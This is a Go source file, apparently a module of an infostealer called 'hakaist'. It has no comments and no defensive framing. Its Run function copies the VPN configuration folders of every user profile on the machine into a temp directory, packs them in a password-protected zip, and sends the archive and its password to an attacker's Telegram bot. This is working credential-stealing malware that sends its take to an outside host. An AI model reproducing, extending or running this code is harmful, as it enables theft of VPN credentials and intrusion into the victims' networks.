package vpn

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/lukyydnv/hakaist/pkg/utils/common"
	"github.com/lukyydnv/hakaist/pkg/utils/fileutil"
	"github.com/lukyydnv/hakaist/pkg/utils/requests"
)

func Run(botToken, chatId string) {
	vpnsTempDir := filepath.Join(os.TempDir(), "vpns-temp")
	os.MkdirAll(vpnsTempDir, os.ModePerm)

	var vpnsFound strings.Builder

	for _, user := range common.GetUsers() {
		for name, relativePath := range VpnPaths() {
			vpnsPath := filepath.Join(user, relativePath)
			if !fileutil.Exists(vpnsPath) || !fileutil.IsDir(vpnsPath) {
				continue
			}

			vpnsDestPath := filepath.Join(vpnsTempDir, filepath.Base(user), name)
			if err := fileutil.CopyDir(vpnsPath, vpnsDestPath); err == nil {
				vpnsFound.WriteString(fmt.Sprintf("\n✅ %s - %s", filepath.Base(user), name))
			}
		}
	}

	if vpnsFound.Len() == 0 {
		return
	}

	vpnsFoundStr := vpnsFound.String()
	if len(vpnsFoundStr) > 4090 {
		vpnsFoundStr = "Numerous vpns to explore."
	}

	vpnsTempZip := filepath.Join(os.TempDir(), "vpns.zip")
	password := common.RandString(16)
	if err := fileutil.ZipWithPassword(vpnsTempDir, vpnsTempZip, password); err != nil {
		fmt.Println("Error zipping directory:", err)
		return
	}

	message := "Password :" + password + "Founds: " + vpnsFoundStr
	requests.Send2TelegramDocument(botToken, chatId, vpnsTempZip)
	requests.Send2TelegramMessage(botToken, chatId, message)

}
